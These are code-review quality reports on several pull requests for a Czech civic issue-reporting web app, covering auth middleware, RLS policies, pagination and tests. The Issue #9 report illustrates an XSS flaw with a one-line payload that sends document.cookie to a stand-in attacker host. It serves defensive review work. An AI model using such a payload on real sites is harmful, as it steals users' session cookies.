# Quality Report — Issue #14 / PR #25

**Reviewed by:** The Squirrel
**PR:** #25 (`issue-14-admin-panel` → `main`)
**Date:** 2026-03-01

---

## Status: 🟢 GOOD NUT

*(Initial review: 🟡 SUSPICIOUS NUT — showstopper fixed by Oompa Loompa, re-reviewed 2026-03-01)*

---

## Executive Summary

The admin panel implementation is structurally sound: correct file pattern (page/Client/actions), proper Zod validation, defence-in-depth auth checks, RLS migration, and solid test coverage (10 action tests + 3 middleware tests, 121 total passing). The initial `defaultValue` (uncontrolled select) showstopper has been fixed: `AdminClient` now uses a controlled `statuses` state record keyed by report ID, updated optimistically and rolled back on failure. All 121 tests pass, lint is clean.

---

## Fixed Issues

### ~~1. Stale `<select>` after status update~~ — FIXED

`AdminClient.tsx` now uses `value={statuses[report.id]}` (controlled) with a `statuses` state record initialised from props. The select updates immediately on change (optimistic) and rolls back to the previous value on server error. No more split-brain UI.

---

## Code Smells & Improvements

### A. RLS admin UPDATE policy has no column-level guard (`20260301000000_add_admin_role.sql:16`)

The policy grants admins `UPDATE` on the **entire** `reports` row, not just `status`. Application-level code only touches `status` and `updated_at`, so this is not exploitable through the app — but a crafted PostgREST call could update any column (title, location, etc.) by an admin. Consider column-level privileges or a `WITH CHECK` that is explicit. Non-blocking for MVP.

### B. Redundant admin check in `page.tsx` (lines 19–27)

Middleware already rejects non-admins before the request reaches the server component. The second DB query in `page.tsx` adds ~1 RTT per page load for zero additional security. Safe to remove; harmless to keep.

### C. No pagination in admin list (`page.tsx:29-32`)

All reports are fetched with no `limit`. Fine for MVP, will degrade at scale. Track as future tech debt.

---

## Test Coverage Analysis

| Scope | Tests | Quality |
|---|---|---|
| `updateReportStatus` action | 10 | Excellent — covers unauthenticated, non-admin, invalid UUID, invalid status, all 4 valid statuses, DB error, happy path |
| Middleware `/admin` routes | 3 | Good — covers unauthenticated→/login, non-admin→/, admin→pass |
| `AdminClient` component | 0 | Gap — no render tests; a controlled-select test would have caught the showstopper |

Action and middleware tests are comprehensive. The missing component tests are acceptable for a first pass but a test for post-update select state would catch the bug above.

**121 / 121 tests pass.**

---

## Verdict

🟢 Ready to ship. Showstopper fixed; remaining items are non-blocking tech debt for future iterations.

---

# Quality Report — Issue #13 / PR #24

**Reviewed by:** The Squirrel
**PR:** #24 (`issue-13-pagination-filters` → `main`)
**Date:** 2026-03-01 (initial) / 2026-03-01 (re-review after fixes)

---

## Status: 🟢 GOOD NUT

---

## Executive Summary

Both showstoppers from the initial review were fixed in `a32eef1` and verified by the Squirrel on re-review. NaN guard is correct (`parseInt(...) || 1`), visual collision resolved (`bottom-20` offset when pagination visible), and two regression tests were added covering each fix. 108 / 108 tests pass, lint is clean. Architecture is sound, `buildUrl` abstraction is clean, server-side query construction is idiomatic. **Approved for merge.**

---

## Critical Issues (Showstoppers)

None. Previously raised issues resolved:

| Issue | Fix | Regression Test |
|---|---|---|
| NaN propagation for `?page=abc` | `parseInt(...) \|\| 1` at `page.tsx:20` | `page.test.tsx:169` — `range(0, 19)` asserted |
| Pagination bar / logged-out prompt overlap | `bottom-20` when `totalPages > 1` at `ReportsClient.tsx:201` | `ReportsClient.test.tsx:191–201` — two tests |

---

## Code Smells & Improvements (non-blocking)

- **No allowlist validation on `status` / `category` params**: Arbitrary strings (e.g. `?status=garbage`) reach `.eq()` unchecked. Not a SQL injection risk (Supabase uses parameterised queries), but the user gets a silently empty map with no guidance.
- **`CATEGORIES` constant is duplicated**: Same array in `ReportsClient.tsx` and `ReportForm.tsx`. A shared `src/app/reports/constants.ts` would prevent drift.
- **Redundant guard in `handlePrevPage`**: The `if (currentPage > 1)` guard duplicates the `disabled={currentPage <= 1}` on the button. Harmless dead-path code.

---

## Test Coverage Analysis

| Area | Status |
|---|---|
| Happy-path pagination (range calculation) | ✅ |
| Filter params → `.eq()` calls | ✅ |
| `totalPages` computed from `count` | ✅ |
| Negative page clamped to 1 | ✅ |
| No `.eq()` when no filters active | ✅ |
| Filter bar UI rendered | ✅ |
| Pagination bar visibility | ✅ |
| Prev / Next navigation | ✅ |
| Disabled states | ✅ |
| Filter state preserved across pages | ✅ |
| `?page=abc` (NaN) case | ✅ Added in fix commit |
| Logged-out prompt position with pagination | ✅ Added in fix commit (2 tests) |

**108 / 108 tests pass.**

---

## Verdict

All showstoppers resolved. Code is clean, tested, and idiomatic. **→ Merge.**

---

# Quality Report — Issue #12 Review

**Reviewed by:** The Squirrel
**PR:** #23 (`issue-12-public-read` → `main`)
**Date:** 2026-03-01

---

## Status: 🟢 GOOD NUT

---

## Executive Summary

Surgical, minimal, and correct. Two `startsWith` guards added to middleware, 26 lines changed in `TopicsClient.tsx` to gate interactive controls for anonymous users, 13 comprehensive middleware tests added. All 88 tests pass. Lint clean. The existing RLS policies already covered the DB layer (`FOR SELECT USING (true)` on both `reports` and `topics`). The approach is consistent with the project's architecture: middleware bypass → action-layer auth guard as a double fence. Ready to ship.

---

## Critical Issues (Showstoppers)

None.

---

## Code Smells & Improvements

### 1. Stray Dev Comment in Test File (`TopicsClient.test.tsx:99–101`)

```ts
// Comments are initially hidden? Wait, I should check the code.
// In my code: {commentingOn === topic.id && (...)}
// Initially commentingOn is null.
```

Live-coding thought process left committed. Harmless but unprofessional in a test suite.

### 2. Method-Agnostic Middleware Bypass (`proxy.ts:42–43`)

The `startsWith('/reports')` and `startsWith('/topics')` guards bypass the login redirect for **all HTTP methods**, not just GET. An unauthenticated POST to `/reports/anything` passes the middleware unchallenged. This is not a vulnerability — Server Actions check `auth.getUser()` independently, and RLS blocks unauthenticated writes — but it is a defense-in-depth gap that may confuse future maintainers.

### 3. Unreachable Guard in `handleVote` (`TopicsClient.tsx:98–101`)

```ts
if (!user) {
  router.push('/login');
  return;
}
```

Vote buttons are only rendered in the `{user ? (...) : (...)}` branch, so this guard can never be reached by an anonymous user through the normal UI. Defensive, harmless, but dead code.

---

## Test Coverage Analysis

| File | Tests | Assessment |
|---|---|---|
| `proxy.test.ts` | 13 (new) | Excellent. Public routes (/, /login, /auth/*, /reports, /reports/123, /topics, /topics/456), protected routes (/dashboard, /profile, /settings), and authenticated passthrough all covered. |
| `TopicsClient.test.tsx` | 12 | Updated. New `shows login link for votes when logged out` test directly validates the anonymous UX. Optimistic-UI and toggle tests retained and all green. |
| Remaining suites | 63 | Unchanged, no regressions. |

**Total: 88 / 88 passing.**

---

## Verdict

The three issues above are cosmetic (stray comment), an acceptable architectural style choice (action-layer is the authoritative gate), and dead defensive code. None are blockers.

**→ Approved for merge.**

---

# Quality Report — Issue #10 Review

**Reviewed by:** The Squirrel
**PR:** #20 (`issue-10-pulse-dashboard` → `main`)
**Date:** 2026-03-01

---

## Status: 🟡 SUSPICIOUS NUT — Ship with caution

---

## Executive Summary

Story 1.4.2 (Pulse Dashboard) delivers what was asked: an analytics page with aggregated stats, latest reports, popular topics, and a geographic heatmap. All 75 tests pass, lint is clean. The PR itself is minimal and correct — one new test, one DEVLOG entry. However, the underlying dashboard implementation (delivered as groundwork in a prior sprint) carries three technical debt items that the Squirrel cannot ignore: duplicated status-label logic across two files, an over-fetching `select('*')`, and a double database query that fetches reports twice.

None of these are showstoppers. The story requirements are fully met. This is mergeable, but the DRY violation should be addressed before the status system grows any further.

---

## Critical Issues (Showstoppers)

None.

---

## Code Smells & Improvements

### 1. DRY Violation — Status Labels Duplicated in Two Files

`dashboard/page.tsx:174-181` uses chained ternary expressions to map status codes to Czech labels and Tailwind colour classes. `Map.tsx:215-225` solves the same problem with a `Record<string, string>` lookup object.

The same four labels (`Čeká`, `V řešení`, `Vyřešeno`, `Zamítnuto`) and similar colour classes appear in two independent locations. If a fifth status is ever added, someone will update one and forget the other.

**Fix:** Extract status labels and colours into a shared `src/lib/reportStatus.ts` constant and import it in both files.

### 2. Double Fetch of Reports (`dashboard/page.tsx:15-28`)

Reports are queried **twice** in the same server component:
- `reportsResponse` — fetches all reports (specific columns) for stats aggregation.
- `latestReportsResponse` — fetches `*` from the same table, ordered by date, limited to 5.

The "latest 5" are a strict subset of the first query's data. At current scale this is harmless, but two round-trips to the same table in a single page load is wasteful and will show up as duplicate queries in the Supabase dashboard.

### 3. `select('*')` in Latest Reports Query (`dashboard/page.tsx:22`)

The `latestReports` fetch uses `select('*')` but the UI only consumes `id`, `title`, `rating`, `category`, `status`, and `created_at`. This silently over-fetches `description`, `location`, and any future columns added to the `reports` table.

### 4. Silent Error Swallowing (`dashboard/page.tsx:30-31`)

All three Supabase responses destructure only `.data`, ignoring `.error`. A failing query produces an empty list with no indication to the user that something went wrong. A comment, a log call, or a minimal error state would make this easier to debug in production.

### 5. Hardcoded "Aktivní" System Status (`dashboard/page.tsx:121`)

The system-status card always renders the string `"Aktivní"` regardless of actual system health. This is fine for an MVP placeholder, but the field label promises something it does not deliver. Either derive a real status or rename it to something honest (e.g., "Verze", "Datum nasazení").

---

## Test Coverage Analysis

**Result: Good.** 5 tests, all passing. 75 total tests pass across the suite.

The new test (`renders Czech status labels for reports in the dashboard`) is well-structured: it seeds all four status variants and asserts the correct Czech text for each. It follows the established mock pattern and is readable.

Existing tests cover:
- Happy-path rendering with data present
- Empty state (no reports, no topics, zero stats)
- Statistics calculation (average rating, resolved count)
- Topic sort order (by comment count)
- Czech status labels (new, added in this PR)

**Gap:** No test exercises the `location.coordinates` path for the heatmap map data transformation (`mapReports` on line 46-60). A null/malformed `location` would cause an unguarded runtime crash.

---

## Verdict

Merge with the following tracked as follow-up work:

1. **Extract status labels/colours to a shared constant** — kills the DRY violation before it spawns a third copy.
2. **Consolidate the double reports fetch** — one query, derive latest-5 from the result.
3. **Fix `select('*')`** — name only the columns the UI actually reads.

The PR itself (one test + DEVLOG) is clean. The issues live in the implementation layer that landed before this PR. Flag them on the backlog and ship it.

---

# Quality Report — Issue #9 Review

**Reviewed by:** The Squirrel
**PR:** #19 (`issue-9-final-tests` → `main`)
**Date:** 2026-03-01

---

## Status: 🔴 BAD NUT — DO NOT MERGE

---

## Executive Summary

The feature work for Issue #9 is functionally solid and well-tested (69/69 tests passing). The architecture follows established patterns cleanly. However, the PR introduces an **accidental binary temp file** that must never reach `main`, and the underlying codebase (already in `main`) contains an **unmitigated XSS vulnerability** in the Map popup that was missed during prior reviews. These two issues block merge.

---

## Critical Issues (Showstoppers)

### 1. 🚨 Accidental Binary Temp File in PR (`..geminiigore.un~`)

The PR includes a binary file named `..geminiigore.un~` — a leftover undo/backup file from a text editor (likely Vim or Emacs). This was accidentally committed in `c355c1c`.

**Impact:** Pollutes the repository history permanently. Looks unprofessional. Binary blobs of unknown origin in a codebase are a liability.

**Fix:** Remove this file before merging. The `.geminiignore` file that was also added is acceptable (it's intentional), but the tilde file must go.

---

### 2. 🔒 XSS Vulnerability in `Map.tsx:230-231`

User-supplied content is interpolated directly into raw HTML without sanitization:

```typescript
// src/components/Map.tsx:230-234
<h3 class="font-bold text-zinc-900">${report.title}</h3>
<p class="text-sm text-zinc-600 mt-1">${report.description || ''}</p>
...
<span ...>${report.category || 'Bez kategorie'}</span>
```

An authenticated user can create a report with a title of `<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>` and steal session cookies from every user who opens the map. Zod validates *length* of these fields, not *content*.

This vulnerability was introduced in a prior commit and exists in `main` already. The PR should not be merged on top of a codebase with an open XSS sink. This must be fixed (escape the strings before interpolation, or use `maplibregl.Popup.setText()` / create DOM nodes manually).

---

## Code Smells & Improvements

### Minor — Shared `error` State Across All Operations (`TopicsClient.tsx:47`)

A single `error` state is shared across voting, commenting, and topic creation. A vote error will be overwritten by a concurrent comment error, or vice versa. Fine for MVP but creates confusing UX as the app grows.

### Minor — Double Supabase Query for Reports in Dashboard (`dashboard/page.tsx:15-28`)

Reports are fetched twice: once for all-time stats (`allReportsData`) and once for the latest 5 (`latestReports`). The second query is redundant — the latest 5 can be derived from the first result. At scale this is wasteful.

### Minor — `description` Schema Inconsistency (`topics/actions.ts:9`)

```typescript
description: z.string().min(10, ...).max(1000).optional(),
```

`optional()` means an empty string `""` submitted by the form will fail `min(10)`, but a missing value (`null`) passes. Since the textarea submits `""` when empty, users who type nothing get a validation error about minimum length, even though the label says "(volitelně)" — optional. Should use `.or(z.literal(''))` or `z.string().min(10).optional().or(z.literal(''))` to handle the empty-string case gracefully.

### Trivial — `select('*')` in Dashboard Latest Reports (`dashboard/page.tsx:22`)

Over-fetches all columns when only `id, title, rating, category, status` are needed for the UI.

---

## Test Coverage Analysis

**Result: Strong.** 69 tests, 13 test files, 100% passing.

- `TopicsClient.test.tsx` — Excellent coverage: optimistic voting toggle, vote switch (up→down), comment submission + form reset, error state display, unauthenticated redirect.
- `TopicForm.test.tsx` (new in this PR) — Covers happy path, error display, disabled state, close button. Appropriate for the component's scope.
- `Map.test.tsx` — Tests heatmap toggle and status badge injection.
- `actions.test.ts` — Covers toggle voting logic (insert/delete/update), `addComment` validation, auth guards.

**One gap:** No test covers the XSS escape path in Map popups (because there is no escape — this gap reveals the vulnerability).

---

## Verdict

Fix these two issues, then it's shippable:

1. **Remove `..geminiigore.un~`** from the PR branch before merging.
2. **Sanitize user content** before injecting into `setHTML()` in `Map.tsx`.

Everything else — architecture, optimistic UI, voting logic, server actions, component decomposition — is clean and production-ready.
